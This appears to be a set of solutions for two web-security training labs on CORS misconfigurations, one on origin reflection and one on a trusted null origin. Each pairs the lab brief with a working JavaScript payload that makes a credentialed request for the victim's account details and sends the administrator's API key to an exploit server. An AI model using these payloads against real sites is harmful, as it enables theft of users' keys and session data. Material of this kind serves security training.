```
Lab: CORS vulnerability with basic origin reflection

APPRENTICE

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 
```
```javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a670091035dc89d815ecf8a00f100fb.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

---
```
Lab: CORS vulnerability with trusted null origin

APPRENTICE

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 
```
```javascript
<iframe name="test" srcdoc="<script>
var req = new XMLHttpRequest();
var url='https:\/\/0a2f00ae049120cc8054b780002f00ce.web-security-academy.net\/accountDetails';
req.open('GET', url, false);
req.withCredentials = true;
req.send();
const obj = JSON.parse(req.responseText);
req.open('get', 'https://exploit-0a8f000e0411200080afb60e01b90086.web-security-academy.net/?apikey=' + obj.apikey, false);
req.send();
</script>" sandbox="allow-scripts" width="0px" height="0px" style="border: 0px none;"></iframe>
```

---